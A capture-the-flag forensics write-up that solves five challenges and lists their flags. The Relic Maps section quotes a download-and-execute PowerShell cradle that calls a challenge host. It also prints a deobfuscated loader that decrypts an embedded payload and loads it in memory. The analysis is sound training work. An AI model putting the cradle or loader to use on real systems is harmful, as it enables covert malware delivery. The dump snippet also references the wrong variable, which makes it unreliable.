# Forensics Challenges

## Plaintext Tleasure

As the title says - the flag is in plain text in capture.pcap

> HTB{th3s3_4l13ns_st1ll_us3_HTTP}

## Alien Cradle

View cradle.ps1, `$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}'`

> HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}

## Extraterrestrial Persistence

Yet another base64 string.

> HTB{th3s3_4l13nS_4r3_s00000_b4s1c}

## Packet Cyclone

Just run the recommended tool ([chainsaw](https://github.com/WithSecureLabs/chainsaw)) and answer questions based on its output.

## Relic Maps

Download relicmaps.one
I don't have OneNote installed so just ran `strings` on it and found this interesting piece (VBScript in HTML - I guess it was supposed to run when you view the file?):

```powershell
<#snip#>
ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
<#snip#>
```

Download both files. Spent some time investigating topsecret-maps.one contents, extracted PNG with a map - but it turned out to be a red herring.
Next, concentrated on the obfuscated BAT file.
Obfuscation is pretty simple:
first, `set "eFlP=set "` ie `set` command becomes `eFlP`
then a long chain of `%eFlP%"ualBOGvshk=ws"` - `set SOMETHING=....` where `SOMETHING` is a random string and `....` is 4 characters.
Either use search & replace (manual, long process) or script it to deobfuscate the file.

This should produce the following result (some variables renamed for clarity):

```powershell
$Base64Str = "SEWD/RSJz4q <#snip#> ="

$BinaryStream = [System.Convert]::FromBase64String($Base64Str);
$AESDecryptor = New-Object System.Security.Cryptography.AesManaged;
$AESDecryptor.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$AESDecryptor.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$AESDecryptor.Key = [System.Convert]::FromBase64String('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=');
$AESDecryptor.IV = [System.Convert]::FromBase64String('2hn/J717js1MwdbbqMn7Lw==');
$AESDecryptorObject = $AESDecryptor.CreateDecryptor();
$DecryptedBinaryStream = $AESDecryptorObject.TransformFinalBlock($BinaryStream, 0, $BinaryStream.Length);
$AESDecryptorObject.Dispose();
$AESDecryptor.Dispose();

$mNKMr = New-Object System.IO.MemoryStream(, $DecryptedBinaryStream);
$bTMLk = New-Object System.IO.MemoryStream;
$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress);
$NVPbn.CopyTo($bTMLk);
$NVPbn.Dispose();
$mNKMr.Dispose();
$bTMLk.Dispose();
$DecryptedBinaryStream = $bTMLk.ToArray();
$gDBNO = [System.ReflectionAssembly]::Load($DecryptedBinaryStream);
$PtfdQ = $gDBNO.EntryPoint;
$PtfdQ.Invoke($null, (, [string[]] ('%*')))%
```

Then I modified unobfuscated PowerShell script to dump decrypted buffer contents to a file instead of running it:

```powershell
<#snip#>
$DecryptedBinaryStream = $bTMLk.ToArray();
Set-Content -Path output.file -AsByteStream -Value $EncryptedBinaryStream
```

This produced a .NET dll which I did not bother to reverse engineer since the flag is there in plain text (in UTF-16 encoding):

> HTB{0neN0Te?_iT'5_4_tr4P!}
